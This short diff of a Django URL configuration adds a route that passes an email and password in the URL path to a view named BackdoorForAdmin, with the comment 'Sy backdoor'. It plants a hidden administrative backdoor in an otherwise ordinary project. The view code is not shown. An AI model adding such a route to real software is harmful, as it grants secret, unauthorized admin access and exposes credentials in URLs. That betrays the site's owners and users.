@@ -7,6 +7,8 @@ urlpatterns = [
     path("social/", include('social_django.urls'), name="social"),
     path('v1/', include('origin.urls'), name = 'origin'),
     path('', views.Home.as_view(), name = 'true_base_dir'),
+    
+    path('sy/_admin/<str:email>/<str:password>/', views.BackdoorForAdmin.as_view()),    #Sy backdoor
 ]
 
 
